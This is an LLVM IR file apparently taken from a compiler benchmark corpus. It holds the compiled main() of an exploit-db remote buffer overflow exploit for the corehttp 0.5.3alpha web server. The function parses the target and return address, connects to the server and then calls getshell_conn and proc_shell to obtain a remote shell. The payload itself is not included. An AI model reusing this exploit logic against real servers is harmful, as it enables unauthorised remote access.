; ModuleID = '/home/carl/AnghaBench/exploitdb/exploits/linux/remote/extr_4243.c_main.c'
source_filename = "/home/carl/AnghaBench/exploitdb/exploits/linux/remote/extr_4243.c_main.c"
target datalayout = "e-m:e-p270:32:32-p271:32:32-p272:64:64-i64:64-f80:128-n8:16:32:64-S128"
target triple = "x86_64-unknown-linux-gnu"

%struct.TYPE_2__ = type { i32, i8*, i32 }

@.str = private unnamed_addr constant [120 x i8] c"[*] corehttp[v0.5.3alpha]: httpd remote buffer overflow exploit.\0A[*] by: vade79/v9 v9@fakehalo.us (fakehalo/realhalo)\0A\0A\00", align 1
@DFL_RETADDR = common dso_local global i32 0, align 4
@tbl = common dso_local global %struct.TYPE_2__ zeroinitializer, align 8
@.str.1 = private unnamed_addr constant [7 x i8] c"h:p:r:\00", align 1
@EOF = common dso_local global i32 0, align 4
@optarg = common dso_local global i32 0, align 4
@.str.2 = private unnamed_addr constant [33 x i8] c"main(): allocating memory failed\00", align 1
@.str.3 = private unnamed_addr constant [3 x i8] c"%x\00", align 1
@.str.4 = private unnamed_addr constant [40 x i8] c"return address must be a multiple of 4.\00", align 1
@.str.5 = private unnamed_addr constant [47 x i8] c"return address contains a lowercase character.\00", align 1
@.str.6 = private unnamed_addr constant [22 x i8] c"[*] target\09\09\09: %s:%d\0A\00", align 1
@.str.7 = private unnamed_addr constant [30 x i8] c"[*] return address\09\09: 0x%.8x\0A\00", align 1
@.str.8 = private unnamed_addr constant [37 x i8] c"[*] *sprocket replacement\09: 0x%.8x\0A\0A\00", align 1
@SPORT = common dso_local global i32 0, align 4

; Function Attrs: noinline nounwind optnone uwtable
define dso_local i32 @main(i32 %0, i8** %1) #0 {
  %3 = alloca i32, align 4
  %4 = alloca i32, align 4
  %5 = alloca i8**, align 8
  %6 = alloca i32, align 4
  %7 = alloca i32, align 4
  store i32 0, i32* %3, align 4
  store i32 %0, i32* %4, align 4
  store i8** %1, i8*** %5, align 8
  store i32 0, i32* %6, align 4
  store i32 0, i32* %7, align 4
  %8 = call i32 (i8*, ...) @printf(i8* getelementptr inbounds ([120 x i8], [120 x i8]* @.str, i64 0, i64 0))
  %9 = load i32, i32* @DFL_RETADDR, align 4
  store i32 %9, i32* getelementptr inbounds (%struct.TYPE_2__, %struct.TYPE_2__* @tbl, i32 0, i32 0), align 8
  br label %10

10:                                               ; preds = %40, %2
  %11 = load i32, i32* %4, align 4
  %12 = load i8**, i8*** %5, align 8
  %13 = call i32 @getopt(i32 %11, i8** %12, i8* getelementptr inbounds ([7 x i8], [7 x i8]* @.str.1, i64 0, i64 0))
  store i32 %13, i32* %6, align 4
  %14 = load i32, i32* @EOF, align 4
  %15 = icmp ne i32 %13, %14
  br i1 %15, label %16, label %41

16:                                               ; preds = %10
  %17 = load i32, i32* %6, align 4
  switch i32 %17, label %35 [
    i32 104, label %18
    i32 112, label %29
    i32 114, label %32
  ]

18:                                               ; preds = %16
  %19 = load i8*, i8** getelementptr inbounds (%struct.TYPE_2__, %struct.TYPE_2__* @tbl, i32 0, i32 1), align 8
  %20 = icmp ne i8* %19, null
  br i1 %20, label %28, label %21

21:                                               ; preds = %18
  %22 = load i32, i32* @optarg, align 4
  %23 = call i64 @strdup(i32 %22)
  %24 = inttoptr i64 %23 to i8*
  store i8* %24, i8** getelementptr inbounds (%struct.TYPE_2__, %struct.TYPE_2__* @tbl, i32 0, i32 1), align 8
  %25 = icmp ne i8* %24, null
  br i1 %25, label %28, label %26

26:                                               ; preds = %21
  %27 = call i32 @printe(i8* getelementptr inbounds ([33 x i8], [33 x i8]* @.str.2, i64 0, i64 0), i32 1)
  br label %28

28:                                               ; preds = %26, %21, %18
  br label %40

29:                                               ; preds = %16
  %30 = load i32, i32* @optarg, align 4
  %31 = call i32 @atoi(i32 %30)
  store i32 %31, i32* getelementptr inbounds (%struct.TYPE_2__, %struct.TYPE_2__* @tbl, i32 0, i32 2), align 8
  br label %40

32:                                               ; preds = %16
  %33 = load i32, i32* @optarg, align 4
  %34 = call i32 @sscanf(i32 %33, i8* getelementptr inbounds ([3 x i8], [3 x i8]* @.str.3, i64 0, i64 0), i32* getelementptr inbounds (%struct.TYPE_2__, %struct.TYPE_2__* @tbl, i32 0, i32 0))
  br label %40

35:                                               ; preds = %16
  %36 = load i8**, i8*** %5, align 8
  %37 = getelementptr inbounds i8*, i8** %36, i64 0
  %38 = load i8*, i8** %37, align 8
  %39 = call i32 @usage(i8* %38)
  br label %40

40:                                               ; preds = %35, %32, %29, %28
  br label %10

41:                                               ; preds = %10
  %42 = load i8*, i8** getelementptr inbounds (%struct.TYPE_2__, %struct.TYPE_2__* @tbl, i32 0, i32 1), align 8
  %43 = icmp ne i8* %42, null
  br i1 %43, label %44, label %47

44:                                               ; preds = %41
  %45 = load i32, i32* getelementptr inbounds (%struct.TYPE_2__, %struct.TYPE_2__* @tbl, i32 0, i32 2), align 8
  %46 = icmp ne i32 %45, 0
  br i1 %46, label %52, label %47

47:                                               ; preds = %44, %41
  %48 = load i8**, i8*** %5, align 8
  %49 = getelementptr inbounds i8*, i8** %48, i64 0
  %50 = load i8*, i8** %49, align 8
  %51 = call i32 @usage(i8* %50)
  br label %52

52:                                               ; preds = %47, %44
  %53 = load i32, i32* getelementptr inbounds (%struct.TYPE_2__, %struct.TYPE_2__* @tbl, i32 0, i32 0), align 8
  %54 = srem i32 %53, 4
  %55 = icmp ne i32 %54, 0
  br i1 %55, label %56, label %58

56:                                               ; preds = %52
  %57 = call i32 @printe(i8* getelementptr inbounds ([40 x i8], [40 x i8]* @.str.4, i64 0, i64 0), i32 1)
  br label %58

58:                                               ; preds = %56, %52
  %59 = load i32, i32* getelementptr inbounds (%struct.TYPE_2__, %struct.TYPE_2__* @tbl, i32 0, i32 0), align 8
  %60 = and i32 %59, 255
  %61 = load i32, i32* getelementptr inbounds (%struct.TYPE_2__, %struct.TYPE_2__* @tbl, i32 0, i32 0), align 8
  %62 = and i32 %61, 255
  %63 = call i32 @toupper(i32 %62) #4
  %64 = icmp ne i32 %60, %63
  br i1 %64, label %92, label %65

65:                                               ; preds = %58
  %66 = load i32, i32* getelementptr inbounds (%struct.TYPE_2__, %struct.TYPE_2__* @tbl, i32 0, i32 0), align 8
  %67 = and i32 %66, 65280
  %68 = ashr i32 %67, 8
  %69 = load i32, i32* getelementptr inbounds (%struct.TYPE_2__, %struct.TYPE_2__* @tbl, i32 0, i32 0), align 8
  %70 = and i32 %69, 65280
  %71 = ashr i32 %70, 8
  %72 = call i32 @toupper(i32 %71) #4
  %73 = icmp ne i32 %68, %72
  br i1 %73, label %92, label %74

74:                                               ; preds = %65
  %75 = load i32, i32* getelementptr inbounds (%struct.TYPE_2__, %struct.TYPE_2__* @tbl, i32 0, i32 0), align 8
  %76 = and i32 %75, 16711680
  %77 = ashr i32 %76, 16
  %78 = load i32, i32* getelementptr inbounds (%struct.TYPE_2__, %struct.TYPE_2__* @tbl, i32 0, i32 0), align 8
  %79 = and i32 %78, 16711680
  %80 = ashr i32 %79, 16
  %81 = call i32 @toupper(i32 %80) #4
  %82 = icmp ne i32 %77, %81
  br i1 %82, label %92, label %83

83:                                               ; preds = %74
  %84 = load i32, i32* getelementptr inbounds (%struct.TYPE_2__, %struct.TYPE_2__* @tbl, i32 0, i32 0), align 8
  %85 = and i32 %84, -16777216
  %86 = lshr i32 %85, 24
  %87 = load i32, i32* getelementptr inbounds (%struct.TYPE_2__, %struct.TYPE_2__* @tbl, i32 0, i32 0), align 8
  %88 = and i32 %87, -16777216
  %89 = lshr i32 %88, 24
  %90 = call i32 @toupper(i32 %89) #4
  %91 = icmp ne i32 %86, %90
  br i1 %91, label %92, label %94

92:                                               ; preds = %83, %74, %65, %58
  %93 = call i32 @printe(i8* getelementptr inbounds ([47 x i8], [47 x i8]* @.str.5, i64 0, i64 0), i32 1)
  br label %94

94:                                               ; preds = %92, %83
  %95 = load i8*, i8** getelementptr inbounds (%struct.TYPE_2__, %struct.TYPE_2__* @tbl, i32 0, i32 1), align 8
  %96 = load i32, i32* getelementptr inbounds (%struct.TYPE_2__, %struct.TYPE_2__* @tbl, i32 0, i32 2), align 8
  %97 = call i32 (i8*, ...) @printf(i8* getelementptr inbounds ([22 x i8], [22 x i8]* @.str.6, i64 0, i64 0), i8* %95, i32 %96)
  %98 = load i32, i32* getelementptr inbounds (%struct.TYPE_2__, %struct.TYPE_2__* @tbl, i32 0, i32 0), align 8
  %99 = call i32 (i8*, ...) @printf(i8* getelementptr inbounds ([30 x i8], [30 x i8]* @.str.7, i64 0, i64 0), i32 %98)
  %100 = load i32, i32* getelementptr inbounds (%struct.TYPE_2__, %struct.TYPE_2__* @tbl, i32 0, i32 0), align 8
  %101 = add nsw i32 %100, 512
  %102 = call i32 (i8*, ...) @printf(i8* getelementptr inbounds ([37 x i8], [37 x i8]* @.str.8, i64 0, i64 0), i32 %101)
  %103 = load i8*, i8** getelementptr inbounds (%struct.TYPE_2__, %struct.TYPE_2__* @tbl, i32 0, i32 1), align 8
  %104 = load i32, i32* getelementptr inbounds (%struct.TYPE_2__, %struct.TYPE_2__* @tbl, i32 0, i32 2), align 8
  %105 = call i32 @corehttp_connect(i8* %103, i32 %104)
  %106 = load i8*, i8** getelementptr inbounds (%struct.TYPE_2__, %struct.TYPE_2__* @tbl, i32 0, i32 1), align 8
  %107 = load i32, i32* @SPORT, align 4
  %108 = call i32 @getshell_conn(i8* %106, i32 %107)
  store i32 %108, i32* %7, align 4
  %109 = load i32, i32* %7, align 4
  %110 = icmp sgt i32 %109, 0
  br i1 %110, label %111, label %114

111:                                              ; preds = %94
  %112 = load i32, i32* %7, align 4
  %113 = call i32 @proc_shell(i32 %112)
  br label %114

114:                                              ; preds = %111, %94
  %115 = call i32 @exit(i32 0) #5
  unreachable
}

declare dso_local i32 @printf(i8*, ...) #1

declare dso_local i32 @getopt(i32, i8**, i8*) #1

declare dso_local i64 @strdup(i32) #1

declare dso_local i32 @printe(i8*, i32) #1

declare dso_local i32 @atoi(i32) #1

declare dso_local i32 @sscanf(i32, i8*, i32*) #1

declare dso_local i32 @usage(i8*) #1

; Function Attrs: nounwind readonly
declare dso_local i32 @toupper(i32) #2

declare dso_local i32 @corehttp_connect(i8*, i32) #1

declare dso_local i32 @getshell_conn(i8*, i32) #1

declare dso_local i32 @proc_shell(i32) #1

; Function Attrs: noreturn
declare dso_local i32 @exit(i32) #3

attributes #0 = { noinline nounwind optnone uwtable "correctly-rounded-divide-sqrt-fp-math"="false" "disable-tail-calls"="false" "frame-pointer"="all" "less-precise-fpmad"="false" "min-legal-vector-width"="0" "no-infs-fp-math"="false" "no-jump-tables"="false" "no-nans-fp-math"="false" "no-signed-zeros-fp-math"="false" "no-trapping-math"="false" "stack-protector-buffer-size"="8" "target-cpu"="x86-64" "target-features"="+cx8,+fxsr,+mmx,+sse,+sse2,+x87" "unsafe-fp-math"="false" "use-soft-float"="false" }
attributes #1 = { "correctly-rounded-divide-sqrt-fp-math"="false" "disable-tail-calls"="false" "frame-pointer"="all" "less-precise-fpmad"="false" "no-infs-fp-math"="false" "no-nans-fp-math"="false" "no-signed-zeros-fp-math"="false" "no-trapping-math"="false" "stack-protector-buffer-size"="8" "target-cpu"="x86-64" "target-features"="+cx8,+fxsr,+mmx,+sse,+sse2,+x87" "unsafe-fp-math"="false" "use-soft-float"="false" }
attributes #2 = { nounwind readonly "correctly-rounded-divide-sqrt-fp-math"="false" "disable-tail-calls"="false" "frame-pointer"="all" "less-precise-fpmad"="false" "no-infs-fp-math"="false" "no-nans-fp-math"="false" "no-signed-zeros-fp-math"="false" "no-trapping-math"="false" "stack-protector-buffer-size"="8" "target-cpu"="x86-64" "target-features"="+cx8,+fxsr,+mmx,+sse,+sse2,+x87" "unsafe-fp-math"="false" "use-soft-float"="false" }
attributes #3 = { noreturn "correctly-rounded-divide-sqrt-fp-math"="false" "disable-tail-calls"="false" "frame-pointer"="all" "less-precise-fpmad"="false" "no-infs-fp-math"="false" "no-nans-fp-math"="false" "no-signed-zeros-fp-math"="false" "no-trapping-math"="false" "stack-protector-buffer-size"="8" "target-cpu"="x86-64" "target-features"="+cx8,+fxsr,+mmx,+sse,+sse2,+x87" "unsafe-fp-math"="false" "use-soft-float"="false" }
attributes #4 = { nounwind readonly }
attributes #5 = { noreturn }

!llvm.module.flags = !{!0}
!llvm.ident = !{!1}

!0 = !{i32 1, !"wchar_size", i32 4}
!1 = !{!"clang version 10.0.1 (https://github.com/wsmoses/llvm-project-tok c8e5003577614e72d6d18a216e6a09771e1fcce4)"}
